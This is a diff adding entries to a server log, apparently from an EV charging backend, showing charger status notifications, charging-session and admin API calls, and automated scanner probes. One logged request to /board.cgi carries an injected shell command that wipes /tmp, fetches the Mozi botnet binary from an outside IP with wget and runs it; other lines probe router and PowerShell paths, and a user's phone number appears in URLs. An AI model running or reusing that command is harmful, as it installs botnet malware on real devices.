@@ -4801,3 +4801,88 @@ HEAD
 2025-01-16T12:07:50.368Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [6ms]
 2025-01-16T12:07:54.425Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
 2025-01-16T12:08:01.953Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T12:07:57Z
+2025-01-16T12:47:48.156Z [32minfo[39m: Application has started
+2025-01-16T12:50:03.408Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T12:50:01Z
+2025-01-16T12:50:04.299Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T12:50:02Z
+2025-01-16T12:50:33.200Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T12:50:31Z
+2025-01-16T12:50:51.140Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [37ms]
+2025-01-16T12:50:51.539Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [4ms]
+2025-01-16T12:50:51.593Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [39ms]
+2025-01-16T12:50:51.966Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [52ms]
+2025-01-16T12:50:56.043Z [32minfo[39m: [POST] /session/transaction - 200 [32ms]
+2025-01-16T12:51:00.028Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T12:50:58Z
+2025-01-16T13:09:58.266Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T13:10:08.172Z [32minfo[39m: [POST] /session/transaction - 200 [1ms]
+2025-01-16T13:15:41.656Z [32minfo[39m: StatusNotification - Connector: 0, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T13:15:39Z
+2025-01-16T13:15:43.383Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T13:15:40Z
+2025-01-16T13:15:52.001Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T13:15:49Z
+2025-01-16T13:16:18.834Z [32minfo[39m: [POST] /session/transaction - 200 [17ms]
+2025-01-16T13:16:23.676Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T13:16:20Z
+2025-01-16T13:17:02.519Z [32minfo[39m: [POST] /session/transaction - 200 [5ms]
+2025-01-16T13:17:05.517Z [32minfo[39m: StatusNotification - Connector: 1, Status: Finishing, ErrorCode: NoError, Timestamp: 2025-01-16T13:17:03Z
+2025-01-16T13:17:47.011Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T13:17:45Z
+2025-01-16T13:17:51.446Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T13:17:49Z
+2025-01-16T13:18:04.253Z [32minfo[39m: [GET] /users/+916299459950/vehicles - 200 [10ms]
+2025-01-16T13:18:04.609Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [2ms]
+2025-01-16T13:18:04.669Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [45ms]
+2025-01-16T13:18:05.069Z [32minfo[39m: [POST] /charger-locations/location/range - 200 [32ms]
+2025-01-16T13:18:17.057Z [32minfo[39m: [POST] /session/transaction - 200 [8ms]
+2025-01-16T13:18:21.766Z [32minfo[39m: StatusNotification - Connector: 1, Status: Charging, ErrorCode: NoError, Timestamp: 2025-01-16T13:18:18Z
+2025-01-16T13:19:05.551Z [32minfo[39m: StatusNotification - Connector: 1, Status: Faulted, ErrorCode: OtherError, Timestamp: 2025-01-16T13:19:03Z
+2025-01-16T13:19:41.886Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T13:19:39Z
+2025-01-16T13:21:04.714Z [32minfo[39m: StatusNotification - Connector: 1, Status: Preparing, ErrorCode: NoError, Timestamp: 2025-01-16T13:21:02Z
+2025-01-16T13:21:05.584Z [32minfo[39m: StatusNotification - Connector: 1, Status: Available, ErrorCode: NoError, Timestamp: 2025-01-16T13:21:03Z
+2025-01-16T14:03:15.433Z [32minfo[39m: [GET] / - 200 [2ms]
+2025-01-16T14:32:47.965Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T15:10:07.961Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [3ms]
+2025-01-16T15:51:06.829Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T16:25:31.873Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T18:09:19.326Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T18:09:20.277Z [31merror[39m: [GET] /favicon.ico - 404 [1ms]
+2025-01-16T18:19:05.061Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T18:23:52.711Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T19:52:11.597Z [31merror[39m: [GET] /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.98.193.73:57576/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron - 404 [1ms]
+2025-01-16T20:40:58.505Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-16T20:44:59.547Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T20:55:26.307Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-16T21:28:55.790Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T21:57:28.893Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-16T23:32:42.358Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-17T00:00:49.939Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-17T01:03:11.835Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-17T01:29:27.977Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [0ms]
+2025-01-17T01:30:25.514Z [31merror[39m: [GET] /cdn-cgi/trace - 404 [1ms]
+2025-01-17T02:04:18.064Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-17T02:29:24.955Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-17T02:29:25.360Z [31merror[39m: [GET] /download/powershell/ - 404 [1ms]
+2025-01-17T02:29:25.761Z [31merror[39m: [GET] /get.php - 404 [1ms]
+2025-01-17T02:31:10.427Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-17T02:32:24.629Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-17T03:20:09.757Z [32minfo[39m: [GET] / - 200 [1ms]
+2025-01-17T05:27:39.466Z [32minfo[39m: [GET] / - 200 [0ms]
+2025-01-17T05:31:28.215Z [31merror[39m: [GET] /cgi-bin/luci/;stok=/locale?form=country&operation=read - 404 [1ms]
+2025-01-17T05:45:39.871Z [31merror[39m: [GET] /charger-locations/chargers/all - 401 [2ms]
+2025-01-17T07:03:43.558Z [32minfo[39m: [GET] /charger-locations - 200 [65ms]
+2025-01-17T07:03:46.345Z [32minfo[39m: [GET] /charger-locations - 304 [55ms]
+2025-01-17T07:03:46.384Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [11ms]
+2025-01-17T07:03:54.606Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 200 [26ms]
+2025-01-17T07:04:02.932Z [32minfo[39m: [DELETE] /charger-locations/delete-charger - 200 [38ms]
+2025-01-17T07:04:03.107Z [32minfo[39m: [GET] /charger-locations - 200 [66ms]
+2025-01-17T07:04:03.116Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [7ms]
+2025-01-17T07:04:08.045Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 304 [12ms]
+2025-01-17T07:04:11.829Z [32minfo[39m: [DELETE] /charger-locations/delete-charger - 200 [16ms]
+2025-01-17T07:04:11.953Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [8ms]
+2025-01-17T07:04:12.006Z [32minfo[39m: [GET] /charger-locations - 200 [58ms]
+2025-01-17T07:04:22.259Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 304 [16ms]
+2025-01-17T07:04:26.869Z [32minfo[39m: [DELETE] /charger-locations/delete-charger - 200 [26ms]
+2025-01-17T07:04:27.032Z [32minfo[39m: [GET] /charger-locations - 200 [53ms]
+2025-01-17T07:04:27.053Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [7ms]
+2025-01-17T07:04:30.402Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 304 [19ms]
+2025-01-17T07:05:03.208Z [32minfo[39m: [POST] /charger-locations/add-charger - 200 [17ms]
+2025-01-17T07:05:03.370Z [32minfo[39m: [GET] /charger-locations - 200 [48ms]
+2025-01-17T07:05:03.378Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [7ms]
+2025-01-17T07:05:06.303Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 304 [15ms]
+2025-01-17T07:05:09.197Z [32minfo[39m: [DELETE] /charger-locations/delete-charger - 200 [14ms]
+2025-01-17T07:05:09.367Z [32minfo[39m: [GET] /charger-locations - 200 [57ms]
+2025-01-17T07:05:09.373Z [32minfo[39m: [GET] /charger-locations/location-type-count - 200 [61ms]
+2025-01-17T07:05:16.336Z [32minfo[39m: [GET] /reviews/location/32ed2319730b6de120ed3a1a - 304 [14ms]
